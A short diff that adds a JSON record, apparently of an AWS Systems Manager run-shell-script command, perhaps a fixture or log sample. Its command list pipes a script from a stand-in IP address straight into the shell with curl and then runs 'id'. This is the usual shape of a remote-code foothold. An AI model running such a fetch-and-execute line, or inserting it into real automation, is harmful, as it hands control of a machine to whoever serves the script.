@@ -1,0 +1,1 @@
+{"DocumentInformation":{"CommandID":"2c9e8f3a-1b2d-4c5e-9f60-aabbccddeeff","DocumentName":"AWS-RunShellScript","DocumentVersion":"$DEFAULT","CreatedDate":"2026-11-12T09:30:15.123Z","DocumentStatus":"Success","RunCount":1},"InstancePluginsInformation":[{"Name":"aws:runShellScript","Configuration":{"Properties":{"runCommand":["curl -s http://203.0.113.9/x.sh | sh","id"]}}}]}
